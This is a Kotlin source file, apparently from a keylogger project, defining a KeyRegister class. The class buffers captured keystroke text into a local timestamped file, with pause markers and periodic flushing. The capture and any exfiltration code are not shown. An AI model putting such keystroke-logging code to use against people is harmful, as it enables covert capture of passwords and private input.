package com.github.secretx33.keylogger

import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.io.IOException
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.io.path.Path
import kotlin.io.path.absolutePathString
import kotlin.io.path.outputStream
import kotlin.system.exitProcess
import kotlin.time.Duration
import kotlin.time.Duration.Companion.milliseconds

class KeyRegister(
    private val timeBetweenFlushes: Duration,
    private val appendTimestampAfter: Duration,
) {

    private val isInitialized = AtomicBoolean(false)
    private val file = Path("keys-${LocalDateTime.now().format(FILE_DATE_FORMAT)}.txt")
    private val fileLock = Mutex()
    private val outputStream by lazy { file.outputStream().bufferedWriter() }
    @Volatile
    private var lastAppendAt = Duration.ZERO

    init {
        setupAutoFlush()
    }

    private fun setupAutoFlush() = coroutineScope.launch {
        while (isActive) {
            delay(timeBetweenFlushes)
            flushBuffer()
        }
    }

    suspend fun saveKey(keyText: String) {
        initialize()
        appendTimeMarker()
        appendTextToFile(keyText)
    }

    private suspend fun initialize() {
        if (isInitialized.get()) return
        try {
            fileLock.withLock {
                file.createFileIfNotExists()
            }
            isInitialized.set(true)
        } catch (e: IOException) {
            System.err.println("Could not create file '${file.absolutePathString()}'. Message: ${e.stackTraceToString()}")
            exitProcess(1)
        }
    }

    private fun appendTimeMarker() {
        val now = getNow()
        val lastAppendAt = lastAppendAt
        val interval = now - lastAppendAt

        if (interval > appendTimestampAfter) {
            var message = "[${LocalDateTime.now().format(LOG_DATE_FORMAT)}"
            if (lastAppendAt > Duration.ZERO) {
                outputStream.appendLine()
                message += " (${interval.inWholeSeconds}s)"
            }
            message += "] "
            outputStream.append(message)
        }
        this.lastAppendAt = now
    }

    private fun appendTextToFile(keyText: String) = try {
        outputStream.append(keyText)
    } catch (e: IOException) {
        System.err.println("Could not append text to buffered writer of file '${file.absolutePathString()}'. Message: ${e.stackTraceToString()}")
        exitProcess(1)
    }

    private fun flushBuffer() {
        if (!::outputStream.isLazyInitialized) return
        try {
            outputStream.flush()
        } catch (e: IOException) {
            System.err.println("Could not flush buffered writer to file '${file.absolutePathString()}'. Message: ${e.stackTraceToString()}")
            exitProcess(1)
        }
    }

    private fun getNow(): Duration = System.currentTimeMillis().milliseconds

    private companion object {
        val FILE_DATE_FORMAT: DateTimeFormatter = DateTimeFormatter.ofPattern("yyyy-MM-dd-HH-mm-ss")
        val LOG_DATE_FORMAT: DateTimeFormatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
    }
}